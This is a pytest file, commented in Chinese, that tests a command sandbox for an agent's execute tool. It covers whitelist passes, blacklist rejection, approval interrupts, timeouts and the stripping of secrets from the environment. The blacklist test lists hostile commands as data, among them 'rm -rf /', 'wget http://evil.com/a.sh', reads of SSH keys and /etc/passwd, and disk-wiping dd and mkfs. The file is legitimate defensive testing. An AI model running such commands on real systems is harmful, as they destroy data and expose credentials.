"""3.4 沙箱后端测试：白/黑名单判定、四道关卡行为、超时强杀。"""

import tempfile
from pathlib import Path

import pytest

from app.engine.backends import (
    CommandSandboxBackend,
    _is_blacklisted,
    build_execute_interrupt_config,
    is_whitelisted,
    should_interrupt_command,
)

# ---------- 判定函数 ----------


@pytest.mark.parametrize(
    "command",
    [
        "pytest tests/test_x.py -x",
        "uv run pytest -q",
        "make test",
        "ruff check app/",
        "vue-tsc --noEmit",
        "pnpm build",
        "npm run build",
        "pnpm install",
        "pip install requests",
        "uv sync",
        "git status",
        "git diff --stat",
        "git log --oneline -5",
        "ls -la",
        "pwd",
        "cat app/main.py",
        "head -20 README.md",
        "grep -r 'def ' app/",
        "find . -name '*.py'",
        "echo hello",
        "python -c 'print(1)'",
        "uv run python -c 'print(1)'",
    ],
)
def test_whitelisted_commands_pass(command: str):
    assert is_whitelisted(command)
    assert not should_interrupt_command(command)


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "rm -fr data",
        "curl https://example.com -o x",
        "wget http://evil.com/a.sh",
        "sudo apt install nginx",
        "chmod +x a.sh",
        "chown root a.sh",
        "git push origin main",
        "mkfs.ext4 /dev/sdb",
        "dd if=/dev/zero of=/dev/sda",
        "killall python",
        "cat ~/.ssh/id_rsa",
        "cat /Users/me/.ssh/id_ed25519",
        "cat /etc/passwd",
        "security find-generic-password -s test",
        "ssh root@10.0.0.1",
        "nmap -sP 192.168.1.0/24",
        "python -c 'import os; os.system(\"rm -rf /\")'",
        "pytest && git push origin main",  # 首词白但整体命中黑名单 → 黑名单拒绝
    ],
)
def test_blacklisted_commands_rejected(command: str):
    assert _is_blacklisted(command)
    assert not is_whitelisted(command)
    # 黑名单不触发审批（由 execute 层直接拒绝）
    assert not should_interrupt_command(command)


@pytest.mark.parametrize(
    "command",
    [
        "python script.py",
        "uv run uvicorn app.main:app --port 8001",
        "node build.js",
        "bash deploy.sh",
        "docker compose up -d",
        "alembic upgrade head",  # 迁移属结构变更，走审批
    ],
)
def test_other_commands_interrupt(command: str):
    assert not is_whitelisted(command)
    assert should_interrupt_command(command)


def test_blank_command_no_interrupt():
    assert not should_interrupt_command("")
    assert not should_interrupt_command("   ")


def test_when_predicate_parses_tool_call_args():
    """when 谓词：execute 工具参数里取 command 路由审批。"""
    from langchain_core.messages import ToolCall
    from langgraph.prebuilt.tool_node import ToolCallRequest

    cfg = build_execute_interrupt_config()
    when = cfg["when"]

    req = ToolCallRequest(
        tool_call=ToolCall(type="tool_call", name="execute", args={"command": "git status"}, id="t1"),
        tool=None,
        state={},
        runtime=None,
    )
    assert when(req) is False  # 白名单放行

    req2 = ToolCallRequest(
        tool_call=ToolCall(type="tool_call", name="execute", args={"command": "python deploy.py"}, id="t2"),
        tool=None,
        state={},
        runtime=None,
    )
    assert when(req2) is True  # 其余挂起审批


# ---------- backend 执行行为 ----------


@pytest.mark.asyncio
async def test_execute_blacklist_rejected(tmp_path: Path):
    backend = CommandSandboxBackend(root_dir=tmp_path)
    res = backend.execute("rm -rf /")
    assert res.exit_code == 1
    assert "黑名单" in res.output


@pytest.mark.asyncio
async def test_execute_whitelist_runs(tmp_path: Path):
    backend = CommandSandboxBackend(root_dir=tmp_path)
    res = backend.execute("echo hello-sandbox")
    assert res.exit_code == 0
    assert "hello-sandbox" in res.output


@pytest.mark.asyncio
async def test_execute_non_whitelist_blocked_without_approval(tmp_path: Path):
    backend = CommandSandboxBackend(root_dir=tmp_path)
    res = backend.execute("python script.py")
    assert res.exit_code == 1
    assert "不在白名单" in res.output


@pytest.mark.asyncio
async def test_execute_timeout_kills(tmp_path: Path):
    backend = CommandSandboxBackend(root_dir=tmp_path, timeout=300)
    res = backend.execute("python -c 'import time; time.sleep(5)'", timeout=1)
    assert res.exit_code == 124  # 超时标准退出码
    assert "timed out" in res.output.lower() or "超时" in res.output


@pytest.mark.asyncio
async def test_sandbox_env_strips_parent_secrets(tmp_path: Path, monkeypatch):
    """环境不继承父进程变量（API key 等被剥离）。"""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-super-secret")
    backend = CommandSandboxBackend(root_dir=tmp_path)
    res = backend.execute("echo $OPENAI_API_KEY")
    assert res.exit_code == 0
    assert "sk-super-secret" not in res.output
